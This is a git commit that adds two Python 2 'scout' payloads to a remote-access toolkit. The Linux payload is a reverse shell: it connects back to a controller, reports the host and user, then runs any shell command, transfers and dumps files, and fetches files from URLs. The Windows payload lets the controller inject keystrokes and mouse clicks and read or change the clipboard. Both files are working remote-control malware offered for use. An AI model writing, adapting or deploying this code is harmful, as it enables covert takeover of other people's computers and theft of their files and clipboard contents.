961eee3a556ddbba1a5bdaefc85cdb7ee974af93
orion <32593795+angus-y@users.noreply.github.com>
2017-11-27 15:38:04 +0800

    Add files via upload

---
+++ payloads/lin_shell_payload.py
@@ -0,0 +1,269 @@
+import subprocess, os, socket, re, pickle, docx, urllib2
+from platform import platform
+from getpass import getuser
+from time import sleep
+from datetime import datetime
+
+port = 9999
+ip_addr = '127.0.0.1'
+type_of_scout = 'Command Shell'
+server_key = 'LdtwGvWUNeuRqrxCjpMyFEhnOPsISzBbTfQKVAZkDiomlJHgcX'
+End = 'vfyNAiIeoLbExRYCMWzJtXqcDFZlrapVTKgBmUshSjPkGQHdnu'
+try:
+    operating_sys = platform()
+except:
+    operating_sys = '?????'
+try:
+    hostname = socket.gethostname()
+except:
+    hostname = '?????'
+try:
+    username = getuser()
+except:
+    username = '?????'
+userinfo = hostname + '/' + username
+scout_data = [server_key, userinfo, type_of_scout, operating_sys]
+shell_type = '/bin/bash'
+s = None
+
+help_menu = '''\nCommand Shell Menu
+==================
+
+   Global Commands :
+      banner                            Display a banner
+      help                              Show the help menu
+      quit                              Quit the console
+      clear                             Clear the screen
+
+   Connection commands :
+      disconnect                        Make the scout disconnect and try to reconnect
+      terminate                         Kill tbe scout process
+      sleep <seconds>                   Disconnect the scout and make it sleep for some time
+
+   Command Shell Commands :
+      exec <shell command>              Executes shell command and returns output
+      exec_file <file/executable>       Executes a shell command with no output
+      swap <shell>                      Switch the type of shell used, default is "/bin/bash"
+
+   File Commands :
+      download <filepath>               Download file
+      dump <filepath>                   Dump and view file content(supports .docx file)
+      upload <filepath>                 Upload a file
+      web_download <url>                Download a file through a url\n'''
+
+
+def basename(filepath):
+    basename = re.search(r'[^\\/]+(?=[\\/]?$)', filepath)
+    if basename:
+        return basename.group(0)
+
+
+def recvall(the_socket):
+    total_data = []
+    while True:
+        data = the_socket.recv(8192)
+        if End in data:
+            total_data.append(data[:data.find(End)])
+            break
+        total_data.append(data)
+        if len(total_data) > 1:
+            last_pair = total_data[-2] + total_data[-1]
+            if End in last_pair:
+                total_data[-2] = last_pair[:last_pair.find(End)]
+                total_data.pop()
+                break
+    return ''.join(total_data)
+
+
+def shell_execute(execute):
+    if execute[:3] == 'cd ':
+        try:
+            execute = execute.replace('cd ', '')
+            os.chdir(execute)
+            s.sendall("[+]Changed to directory : " + execute + End)
+        except:
+            s.sendall('[-]Could not change to directory : ' + execute + End)
+    else:
+        try:
+            result = subprocess.Popen(execute, shell=True, executable=shell_type, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                      stdin=subprocess.PIPE)
+            result = result.stdout.read() + result.stderr.read()
+            try:
+                s.sendall(unicode(result + End))
+            except:
+                s.sendall(result + End)
+        except:
+            s.sendall('[-]Could not execute command' + End)
+
+
+def file_execute(command):
+    try:
+        result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                  stdin=subprocess.PIPE)
+        s.sendall('[+]Executed : ' + command + End)
+    except WindowsError:
+        s.sendall('[-]Excutable/file, "' + command + '" does not exist' + End)
+    except Exception as e:
+        s.sendall('[-]Error executing, "' + command + '" : ' + str(e) + End)
+
+
+def upload_file(file_name, content):
+    try:
+        f = open(basename(file_name), 'wb')
+        f.write(content)
+        f.close()
+        s.sendall('[+]Uploaded file successfully' + End)
+    except Exception as e:
+        s.sendall('[-]Error writing to file "' + file_name + '" : ' + str(e) + End)
+
+
+def download_file(file_name):
+    if os.path.isfile(file_name):
+        try:
+            f = open(file_name, 'rb')
+            bin_data = f.read()
+            f.close()
+            s.sendall(file_name + '|/' + bin_data + End)
+        except Exception as e:
+            s.sendall('[-]Error reading from file "' + file_name + '" : ' + str(e) + End)
+    else:
+        s.sendall('[-]File path/name is not valid' + End)
+
+
+def dump_file(file_name):
+    try:
+        if os.path.isfile(file_name):
+            extension = basename(file_name).split('.')[-1]  #
+            if extension == 'docx':
+                try:
+                    doc = docx.Document(file_name)
+                    data = '\n\n'.join([paragraph.text.encode('utf-8') for paragraph in doc.paragraphs])
+                    s.sendall(data + End)
+                except Exception as e:
+                    s.sendall('[-]Error reading "' + file_name + '" : ' + str(e) + End)
+            else:
+                try:
+                    f = open(file_name, 'rb')
+                    data = f.read()
+                    f.close()
+                    try:
+                        s.sendall(unicode(data + End))
+                    except:
+                        try:
+                            s.sendall(data + End)
+                        except Exception as e:
+                            s.sendall('[-]Error dumping file "' + basename(file_name) + '" : ' + str(e) + End)
+                except Exception as e:
+                    s.sendall('[-]Error reading "' + file_name + '" : ' + str(e) + End)
+        else:
+            s.sendall('[-]File path/name is not valid' + End)
+    except Exception as e:
+        s.sendall('[-]Error dumping file : ' + str(e) + End)
+
+
+def download_from_web(url):
+    try:
+        url_data = url.split('/')[-1]
+        file_name = urllib2.unquote(url_data)
+        if file_name == '':
+            file_name = datetime.now().strftime("%Y%m%d-%H%M%S")
+        response = urllib2.urlopen(url)
+        data = response.read()
+        f = open(file_name, 'wb')
+        f.write(data)
+        f.close()
+        s.sendall('[+]Downloaded : ' + url + ' -> ' + file_name + End)
+    except Exception as e:
+        s.sendall('[-]Error downloading file : ' + str(e) + End)
+
+
+def main():
+    global s, shell_type
+    while True:
+        while True:
+            try:
+                s = socket.socket()
+                s.connect((ip_addr, port))
+                break
+            except:
+                sleep(30)
+                continue
+        s.sendall(pickle.dumps(scout_data) + End)
+        while True:
+            try:
+                data = recvall(s).split(' ', 1)
+                command = data[0]
+                if command == 'help':
+                    s.sendall(help_menu + End)
+                elif command == 'disconnect':
+                    s.sendall('[*]Disconnecting...' + End)
+                    break
+                elif command == 'terminate':
+                    s.sendall('[*]Terminating scout...' + End)
+                    os._exit(1)
+                elif command == 'sleep':
+                    try:
+                        sleep_time = int(data[1])
+                    except:
+                        s.sendall('[-]Please specify an integer as the sleep duration' + End)
+                        continue
+                    s.sendall('[*]Scout going offline for : ' + str(sleep_time) + ' seconds' + End)
+                    sleep(sleep_time)
+                    break
+                elif command == 'exec':
+                    try:
+                        execute = data[1]
+                    except:
+                        s.sendall('[-]Specify a command to execute' + End)
+                        continue
+                    shell_execute(execute)
+                elif command == 'exec_file':
+                    try:
+                        execute = data[1]
+                    except:
+                        s.sendall('[-]Specify command/file to execute' + End)
+                        continue
+                    file_execute(execute)
+                elif command == 'swap':
+                    try:
+                        shell_type = data[1]
+                        s.sendall('[+]Current shell in use is : '+shell_type+End)
+                    except:
+                        s.sendall('[-]Specify a shell type'+End)
+                elif command == 'download':
+                    try:
+                        file_name = data[1]
+                    except:
+                        s.sendall('[-]Specify file to download' + End)
+                        continue
+                    download_file(file_name)
+                elif command == 'upload':
+                    data = data[1].split('|/', 1)
+                    file_name = data[0]
+                    file_contents = data[1]
+                    upload_file(file_name, file_contents)
+                elif command == 'dump':
+                    try:
+                        file_target = data[1]
+                    except:
+                        s.sendall('[-]Specify file to dump contents of' + End)
+                        continue
+                    dump_file(file_target)
+                elif command == 'web_download':
+                    try:
+                        download_from_web(data[1])
+                    except IndexError:
+                        s.sendall('[-]Specify URL to download from' + End)
+                        continue
+                    except Exception as e:
+                        s.sendall('[-]Error downloading from url : ' + str(e) + End)
+                        continue
+                else:
+                    s.sendall('[-]Unknown command "' + command + '", run "help" for help menu' + End)
+            except:
+                s.shutdown(1)
+                s.close()
+                break
+
+
+main()
---
+++ payloads/win_injection_payload.py
@@ -0,0 +1,224 @@
+import socket, pickle, pyautogui, os
+from platform import platform
+from getpass import getuser
+from time import sleep
+from win32clipboard import OpenClipboard, CloseClipboard, EmptyClipboard, SetClipboardText, GetClipboardData
+
+port = 9999
+ip_addr = '127.0.0.1'
+type_of_scout = 'Input Injector'
+server_key = 'LdtwGvWUNeuRqrxCjpMyFEhnOPsISzBbTfQKVAZkDiomlJHgcX'
+End = 'vfyNAiIeoLbExRYCMWzJtXqcDFZlrapVTKgBmUshSjPkGQHdnu'
+try:
+    operating_sys = platform()
+except:
+    operating_sys = '?????'
+try:
+    hostname = socket.gethostname()
+except:
+    hostname = '?????'
+try:
+    username = getuser()
+except:
+    username = '?????'
+userinfo = hostname + '/' + username
+scout_data = [server_key, userinfo, type_of_scout, operating_sys]
+powershell = False
+s = None
+pyautogui.FAILSAFE = False
+
+valid_keys = ['\\t', '\\n', '\\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(',
+              ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
+              '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
+              'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
+              'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
+              'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
+              'browserback', 'browserfavorites', 'browserforward', 'browserhome',
+              'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
+              'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
+              'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
+              'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
+              'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
+              'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
+              'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
+              'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
+              'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
+              'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
+              'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
+              'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
+              'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
+              'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
+              'command', 'option', 'optionleft', 'optionright']
+
+help_menu = '''\nInput Injectior  Menu
+==================
+
+   Global Commands :
+      banner                            Display a banner
+      help                              Show the help menu
+      quit                              Quit the console
+      clear                             Clear the screen
+
+   Connection commands :
+      disconnect                        Make the scout disconnect and try to reconnect
+      terminate                         Kill tbe scout process
+      sleep <seconds>                   Disconnect the scout and make it sleep for some time
+
+   Key Injection commands :
+      pr <button>                       Press a button
+      sh <keyboard shortcuts>           Use a keyboard shortcut
+      ty <string>                       Type out a string
+      valids                            Show all valid buttons to use on target
+
+   Mouse Injection commands :
+      click_left                        Click the left mouse button
+      click_right                       Click the right mouse button
+      move_to <X cord> <Y cord>         Move mouse to XY coordinates on screen
+
+   Clipboard commands :
+      clip_clear                        Clear clipboard content
+      clip_dump                         Show clipboard content
+      clip_set <string>                 Edit/set the clipboard content
+
+   Screen command :
+      dimensions                        Get the dimensions/size of screen in terms of XY
+      position                          Get current mouse position on screen in terms of XY coordinates\n'''
+
+def recvall(the_socket):
+    total_data = []
+    while True:
+        data = the_socket.recv(8192)
+        if End in data:
+            total_data.append(data[:data.find(End)])
+            break
+        total_data.append(data)
+        if len(total_data) > 1:
+            last_pair = total_data[-2] + total_data[-1]
+            if End in last_pair:
+                total_data[-2] = last_pair[:last_pair.find(End)]
+                total_data.pop()
+                break
+    return ''.join(total_data)
+
+
+def inject_input(injection_type, arg):
+    try:
+        if injection_type == 'ty':
+            pyautogui.typewrite(arg)
+            s.sendall('[+]Injected typewritten character/s' + End)
+        elif injection_type == 'pr':
+            pyautogui.press(arg)
+            s.sendall('[+]Injected pressed key' + End)
+        elif injection_type == 'sh':
+            if ' ' in arg:
+                arg = arg.split(' ')
+                for key in arg:
+                    pyautogui.keyDown(key)
+                for key in reversed(arg):
+                    pyautogui.keyUp(key)
+                s.sendall('[+]Injected keyboard shortcut' + End)
+            else:
+                pyautogui.hotkey(arg)
+                s.sendall('[+]Injected keyboard shortcut' + End)
+        elif injection_type == 'valids':
+            tar_list = '|/'.join(valid_keys)
+            s.sendall(tar_list + End)
+        elif injection_type == 'clip_clear':
+            OpenClipboard()
+            EmptyClipboard()
+            s.sendall('[+]Cleared clipboard content' + End)
+            CloseClipboard()
+        elif injection_type == 'clip_dump':
+            OpenClipboard()
+            try:
+                injection_type = GetClipboardData()
+            except TypeError:
+                s.sendall('[+]Clipboard content is empty' + End)
+                return
+            CloseClipboard()
+            s.sendall('[+]Dumped content : ' + injection_type + End)
+        elif injection_type == 'clip_set':
+            if not arg:
+                s.sendall('[-]Input a string' + End)
+                return
+            OpenClipboard()
+            EmptyClipboard()
+            SetClipboardText(arg)
+            CloseClipboard()
+            s.sendall('[+]Injected cliboard data' + End)
+        elif injection_type == 'click_left':
+            pyautogui.click(button='left')
+            s.sendall('[+]Injected left mouse click' + End)
+        elif injection_type == 'click_right':
+            pyautogui.click(button='right')
+            s.sendall('[+]Injected right mouse click' + End)
+        elif injection_type == 'move_to':
+            try:
+                arg = arg.split(' ')
+                cord_one = int(arg[0])
+                cord_two = int(arg[1])
+                pyautogui.moveTo(x=cord_one, y=cord_two)
+                s.sendall('[+]Injected mouse movement' + End)
+            except:
+                s.sendall('[-]Input X and Y coordinates as integers' + End)
+                return
+        elif injection_type == 'dimensions':
+            dimensions = pyautogui.size()
+            dimensions = '[+]Dimensions of screen : ' + str(dimensions[0]) + ' x ' + str(dimensions[1])
+            s.sendall(dimensions + End)
+        elif injection_type == 'position':
+            current = pyautogui.position()
+            current = '[+]Current mouse position : ' + str(current[0]) + ' x ' + str(current[1])
+            s.sendall(current + End)
+        else:
+            s.sendall('[-]Unknown command "' + injection_type + '", run "help" for help menu' + End)
+    except Exception as e:
+        s.sendall('[-]Error injecting keystrokes : ' + str(e))
+
+
+def main():
+    global s
+    while True:
+        while True:
+            try:
+                s = socket.socket()
+                s.connect((ip_addr, port))
+                break
+            except:
+                sleep(30)
+                continue
+        s.sendall(pickle.dumps(scout_data) + End)
+        while True:
+            try:
+                data = recvall(s)
+                command = data.split(' ', 1)[0]
+                if command == 'help':
+                    s.sendall(help_menu+End)
+                elif command == 'disconnect':
+                    s.sendall('[*]Disconnecting...' + End)
+                    break
+                elif command == 'terminate':
+                    s.sendall('[*]Terminating scout...' + End)
+                    os._exit(1)
+                elif command == 'sleep':
+                    try:
+                        sleep_time = int(data.split(' ')[1])
+                    except:
+                        s.sendall('[-]Please specify an integer as the sleep duration' + End)
+                        continue
+                    s.sendall('[*]Scout going offline for : ' + str(sleep_time) + ' seconds' + End)
+                    sleep(sleep_time)
+                    break
+                else:
+                    arg = data.split(' ', 1)
+                    if len(arg) > 1:
+                        inject_input(command, arg[1])
+                    else:
+                        inject_input(command, None)
+            except:
+                s.shutdown(1)
+                s.close()
+                break
+
+
+main()
